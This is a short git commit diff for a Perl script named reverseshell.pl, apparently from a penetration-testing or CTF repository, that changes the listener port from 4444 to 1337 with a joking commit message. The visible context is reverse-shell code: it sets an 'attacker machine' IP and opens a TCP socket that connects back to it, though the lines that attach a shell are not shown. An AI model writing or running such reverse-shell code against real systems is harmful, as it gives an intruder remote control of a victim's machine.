9e9650e4d8f86ae6c65627389b4ce9b1a8ae86bf
fp-0 <toots@widgeonsway.ca>
2024-09-06 18:01:42 -0600

    Update reverseshell.pl
    Increased hackeriness by 500%

--- reverseshell.pl
+++ reverseshell.pl
@@ -2,7 +2,7 @@
 use Socket;
 
 $ip = "10.10.10.10";   # Change this to the IP address of your attacker machine
-$port = 4444;          # Change this to the port number that the attacker listens on
+$port = 1337;          # Change this to the port number that the attacker listens on
 
 socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die "Can't create socket: $!";
 connect(SOCK, sockaddr_in($port, inet_aton($ip))) or die "Can't connect: $!";
